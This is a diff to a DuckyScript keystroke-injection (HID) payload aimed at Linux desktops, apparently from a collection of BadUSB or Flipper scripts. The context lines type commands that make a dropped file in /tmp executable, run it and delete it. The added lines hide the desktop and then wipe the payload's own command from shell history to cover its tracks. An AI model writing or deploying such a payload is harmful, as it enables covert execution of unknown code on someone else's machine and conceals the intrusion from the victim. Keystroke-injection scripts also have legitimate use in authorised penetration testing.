@@ -6,6 +6,8 @@ REM Category: Execution
 REM Target: Unix-like operating systems. Linux launcher+delay edit by FalsePhilosopher
 REM Attackmode: HID
 DELAY 300
+WINDOWS d
+DELAY 300
 CTRL-ALT t
 DELAY 1000
 REM sneakyboi method 2
@@ -60,6 +62,19 @@ DELAY 300
 STRING chmod +x /tmp/tmppp && /tmp/./tmppp && rm /tmp/tmppp
 DELAY 200
 ENTER
+STRING history | grep history
+DELAY 200
+ENTER
+STRING line=$(history | grep history | awk '{ print $1 }')
+DELAY 200
+ENTER
+STRING history -d $line
+DELAY 200
+ENTER
+DELAY 200
 STRING set -o history && exit
 DELAY 200
 ENTER
+DELAY 300
+WINDOWS d
+REM insert capslock flashing code here if not using a flipper or other debugger.
